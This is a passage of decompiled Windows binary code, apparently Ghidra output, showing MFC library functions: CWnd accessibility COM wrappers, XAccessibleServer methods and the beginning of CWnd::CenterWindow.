  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1[-2].Data4 + 4));
  local_8 = 0;
  uVar1 = CCmdTarget::ExternalQueryInterface((CCmdTarget *)(param_1 + -3),param_2,in_stack_0000000c)
  ;
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::Invoke(long,struct _GUID const &,unsigned
// long,unsigned short,struct tagDISPPARAMS *,struct tagVARIANT *,struct tagEXCEPINFO *,unsigned int
// *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::Invoke
               (long param_1,_GUID *param_2,ulong param_3,ushort param_4,tagDISPPARAMS *param_5,
               tagVARIANT *param_6,tagEXCEPINFO *param_7,uint *param_8)

{
  long lVar1;
  undefined2 in_stack_00000012;
  uint *in_stack_00000024;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f0d0;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  lVar1 = ATL::AtlIAccessibleInvokeHelper
                    ((IAccessible *)param_1,(long)param_2,(_GUID *)param_3,_param_4,(ushort)param_5,
                     (tagDISPPARAMS *)param_6,(tagVARIANT *)param_7,(tagEXCEPINFO *)param_8,
                     in_stack_00000024);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accParent(struct IDispatch * *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::get_accParent(IDispatch **param_1)

{
  long lVar1;
  undefined4 in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f12c;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,(AFX_MODULE_STATE *)param_1[-5]);
  local_8 = 0;
  lVar1 = (**(code **)(param_1[-0xc] + 0x94))(in_stack_00000008);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accChildCount(long *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::get_accChildCount(long *param_1)

{
  long lVar1;
  undefined4 in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f17a;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,(AFX_MODULE_STATE *)param_1[-5]);
  local_8 = 0;
  lVar1 = (**(code **)(param_1[-0xc] + 0x98))(in_stack_00000008);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accChild(struct tagVARIANT,struct
// IDispatch * *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accValue(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
FID_conflict_get_accValue
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f1c8;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0x9c))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accDescription(struct tagVARIANT,wchar_t *
// *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accName(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
FID_conflict_get_accDescription
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f222;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xa0))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accRole(struct tagVARIANT,struct
// tagVARIANT *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accValue(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
FID_conflict_get_accValue
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f27c;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xa4))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accDescription(struct tagVARIANT,wchar_t *
// *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accState(struct tagVARIANT,struct
// tagVARIANT *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accDescription
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f2d6;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xa8))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accHelp(struct tagVARIANT,wchar_t * *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accRole(struct tagVARIANT,struct
// tagVARIANT *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
FID_conflict_get_accRole
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f330;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xac))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accState(struct tagVARIANT,struct
// tagVARIANT *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accState
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f38a;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xb0))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual long __stdcall CWnd::XAccessible::get_accHelp(struct tagVARIANT,wchar_t * *)
//  public: virtual long __stdcall CWnd::XAccessible::get_accKeyboardShortcut(struct
// tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accHelp
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f3e4;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xb4))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accHelpTopic(wchar_t * *,struct
// tagVARIANT,long *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accHelpTopic
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f43e;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xb8))
                    (param_2,param_3,param_4,param_5,param_6,param_7);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accKeyboardShortcut(struct
// tagVARIANT,wchar_t * *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accKeyboardShortcut
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f49b;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xbc))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accFocus(struct tagVARIANT *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::get_accFocus(tagVARIANT *param_1)

{
  long lVar1;
  undefined4 in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f4f5;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  lVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xc0))(in_stack_00000008);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accSelection(struct tagVARIANT *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::get_accSelection(tagVARIANT *param_1)

{
  long lVar1;
  undefined4 in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f543;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  lVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xc4))(in_stack_00000008);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::get_accDefaultAction(struct tagVARIANT,wchar_t
// * *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::get_accDefaultAction
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f591;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 200))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::accSelect(long,struct tagVARIANT)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::accSelect
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f5eb;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xcc))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::accLocation(long *,long *,long *,long *,struct
// tagVARIANT)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::accLocation
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f645;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xd0))
                    (param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::accNavigate(long,struct tagVARIANT,struct
// tagVARIANT *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::accNavigate
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f6a8;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xd4))
                    (param_2,param_3,param_4,param_5,param_6,param_7);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::accHitTest(long,long,struct tagVARIANT *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::accHitTest(long param_1,long param_2,tagVARIANT *param_3)

{
  long lVar1;
  undefined4 in_stack_00000010;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f705;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  lVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xd8))(param_2,param_3,in_stack_00000010);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::accDoDefaultAction(struct tagVARIANT)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::accDoDefaultAction
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f759;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xdc))(param_2,param_3,param_4,param_5);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::put_accName(struct tagVARIANT,wchar_t *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::put_accName
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f7b0;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xe0))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::put_accValue(struct tagVARIANT,wchar_t *)
// 
// Library: Visual Studio 2008 Release

undefined4
CWnd::XAccessible::put_accValue
          (int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
          undefined4 param_6)

{
  undefined4 uVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f80a;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  uVar1 = (**(code **)(*(int *)(param_1 + -0x30) + 0xe4))(param_2,param_3,param_4,param_5,param_6);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual unsigned long __stdcall CWnd::XAccessibleServer::AddRef(void)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

ulong CWnd::XAccessibleServer::AddRef(void)

{
  ulong uVar1;
  int in_stack_00000004;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f864;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2
            (local_18,*(AFX_MODULE_STATE **)(in_stack_00000004 + -0x18));
  local_8 = 0;
  uVar1 = CCmdTarget::ExternalAddRef((CCmdTarget *)(in_stack_00000004 + -0x34));
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

LONG FUN_0040f8a0(int param_1)

{
  LONG LVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f8ac;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x18));
  local_8 = 0;
  LVar1 = FUN_0040c77d((int *)(param_1 + -0x34));
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return LVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessibleServer::QueryInterface(struct _GUID const &,void
// * *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessibleServer::QueryInterface(_GUID *param_1,void **param_2)

{
  ulong uVar1;
  void **in_stack_0000000c;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f8f4;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)param_1[-2].Data4);
  local_8 = 0;
  uVar1 = CCmdTarget::ExternalQueryInterface
                    ((CCmdTarget *)(param_1[-4].Data4 + 4),param_2,in_stack_0000000c);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessibleServer::SetProxy(struct IAccessibleProxy *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessibleServer::SetProxy(IAccessibleProxy *param_1)

{
  long lVar1;
  undefined4 in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f942;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x18));
  local_8 = 0;
  lVar1 = (**(code **)(*(int *)(param_1 + -0x34) + 0xe8))(in_stack_00000008);
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessibleServer::GetHWND(struct HWND__ * *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

long CWnd::XAccessibleServer::GetHWND(HWND__ **param_1)

{
  long lVar1;
  HWND__ **in_stack_00000008;
  AFX_MAINTAIN_STATE2 local_c [4];
  int local_8;
  
  if (in_stack_00000008 == (HWND__ **)0x0) {
    lVar1 = -0x7fffbffd;
  }
  else {
    AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_c,(AFX_MODULE_STATE *)param_1[-6]);
    *in_stack_00000008 = param_1[-5];
    if (local_8 != 0) {
      FUN_0040ad54();
    }
    lVar1 = 0;
  }
  return lVar1;
}



void __fastcall FUN_0040f9c6(int **param_1)

{
  int *piVar1;
  
  piVar1 = *param_1;
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))(piVar1);
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall CWnd::CenterWindow(class CWnd *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::CenterWindow(CWnd *this,CWnd *param_1)

{
  uint uVar1;
  int iVar2;
  HWND pHVar3;
  int iVar4;
  HWND pHVar5;
  uint *puVar6;
  uint local_64 [5];
  RECT local_50;
  tagRECT local_3c;
  tagRECT local_2c;
  tagRECT local_1c;
  CWnd *local_c;
  ulong local_8;
  
  local_c = this;
  local_8 = GetExStyle(this);
  if (param_1 == (CWnd *)0x0) {
    if ((local_8 & 0x40000000) == 0) {
      pHVar5 = ::GetWindow(*(HWND *)(this + 0x20),4);
    }
    else {
      pHVar5 = GetParent(*(HWND *)(this + 0x20));
    }
    if (pHVar5 != (HWND)0x0) {
      pHVar3 = (HWND)SendMessageW(pHVar5,0x36b,0,0);
      if (pHVar3 != (HWND)0x0) {
        pHVar5 = pHVar3;
      }
    }
  }
  else {
    pHVar5 = *(HWND *)(param_1 + 0x20);
  }
  GetWindowRect(*(HWND *)(this + 0x20),&local_3c);
  if ((local_8 & 0x40000000) == 0) {
    if (pHVar5 != (HWND)0x0) {
      uVar1 = GetWindowLongW(pHVar5,-0x10);
      if (((uVar1 & 0x10000000) == 0) || ((uVar1 & 0x20000000) != 0)) {
        pHVar5 = (HWND)0x0;
      }
    }
    local_64[0] = 0x28;
    if (pHVar5 == (HWND)0x0) {
      pHVar5 = (HWND)AfxGetMainWnd();
      if (pHVar5 != (HWND)0x0) {
        pHVar5 = (HWND)pHVar5[8].unused;
      }
      puVar6 = local_64;
